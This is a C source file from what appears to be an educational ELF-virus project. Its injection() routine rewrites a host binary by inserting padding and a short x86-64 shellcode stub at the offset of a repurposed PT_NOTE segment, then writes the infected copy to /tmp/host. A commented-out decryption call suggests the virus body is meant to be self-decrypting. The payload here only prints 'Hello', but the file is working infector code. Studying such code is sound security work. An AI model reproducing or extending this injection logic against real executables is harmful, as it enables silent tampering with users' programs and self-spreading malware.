#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_host *host, char *ptr, const size_t payload_size)
{
	char *dst = ptr;
	char *src = (char *)host->header;

	for (size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
		*dst++ = *src++;

	for (size_t index = 0; index < payload_size; index++)
		*dst++ = '*';

	for (size_t index = 0; index < host->filesize - (host->note->data->p_offset + host->note->data->p_filesz); index++)
		*dst++ = *src++;
}


static void replicate_on_memory(const struct s_host *host, char *ptr)
{
	const uint8_t buffer[29] =
	{
		0xe8, 0x06, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f,
		0x0a, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x5e, 0xba, 0x06, 0x00,
		0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05
	};

	memcpy(ptr + host->note->self->p_offset, buffer, 29);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain)
{
//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	char *ptr;
	int fd = 0;

	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
	const size_t filesize = host->filesize + payload_size;

	if ((ptr = mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		goto label_error;

	write_on_memory(host, ptr, payload_size);
	replicate_on_memory(host, ptr);

	if ((fd = open("/tmp/host", O_RDWR | O_TRUNC)) < 0)
		goto label_error;

	write(fd, ptr, filesize);
	close(fd);
	munmap(ptr, filesize);

	__exit(host, keychain);

label_error:
	printf("error\n");
	exit(1);
}
